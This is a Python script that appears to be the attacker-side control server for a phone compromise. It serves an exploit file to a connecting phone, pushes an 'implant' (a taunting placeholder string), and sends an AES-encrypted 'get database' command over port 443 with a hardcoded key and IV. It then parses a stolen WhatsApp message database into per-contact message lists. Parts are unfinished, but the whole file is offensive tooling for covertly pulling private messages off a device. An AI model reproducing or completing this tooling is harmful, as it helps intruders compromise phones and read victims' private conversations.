import http.server, socket, sqlite3, json, requests, datetime, os
from Crypto.Cipher import AES
from Crypto import Random

# uses port 12345, ensure later processes use a different port
# TODO move the desired exploit file into this directory so it will be forwarded to the phone when GET request received
def listen_for_phone_and_send_exploit_file(ip_address):
    server_address = (ip_address, 12345)
    print("Localhost waiting on port 12345 for client to connect")
    s = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    s.handle_request()
# 
def send_implant(ip_address):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 6969               
    s.bind((ip_address, port))
    s.listen(1)        
    print("Listening on port 6969 of " + ip_address)        
    count = 0 
    while count < 1:
        conn, addr = s.accept()
        print('Got connection from: ', addr)
        payload = 'HaHahAHa gEt pWnEd LOLOLOL'
        conn.send(payload.encode())
        print("Payload sent to target")
        count += 1
        conn.close() 
        print("Connection closed")

def steal_database():
    print(len("sourdoughtoast12"))
    key = "546869732069732061206b6579313233"
    iv = "5468697320697320616e204956343536"
    obj = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
    ciphertext = obj.encrypt("get0000000000000")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 443             
    s.bind(('', port))
    s.listen(1)
    print("Listening on port 443")
    count = 0 
    while count < 1:
        conn, addr = s.accept()
        print('Got connection from: ', addr)
        conn.send(ciphertext)
        print("Encrypted Get Database command sent to phone")
        count += 1
        conn.close() 
        print("Connection closed")

# Parses WhatsApp message database and stores the messages in a dictionary
def decode_whatsapp_messages():
    print("Starting to decode WhatsApp messages from the SQLite3 Database")
    path_to_msg_database = '../whatsapp-databases/msgstore.db'
    c = connect_to_db(path_to_msg_database)
    c.execute("SELECT * FROM legacy_available_messages_view;")
    messages = c.fetchall()
    
    # message tuple design key = contact values = (message, from_me, timestamp)
    message_dict = {}
    for message in messages:
        if message[1] not in message_dict:
            if message[6] is not None:
                message_dict[message[1]] = [(message[6], message[2], message[7])]
        else:
            message_dict[message[1]].append((message[6], message[2], message[7]))

    for key in message_dict.keys():
        print("Key : {} , Value : {}".format(key,message_dict[key]))


def connect_to_db(filepath):
    conn = sqlite3.connect(filepath)
    c = conn.cursor()
    return c

if __name__ == "__main__":
    # host = 'localhost'
    # listen_for_phone_and_send_exploit_file(host)
    # send_implant(host)
    steal_database()
    # decode_whatsapp_messages()
 
   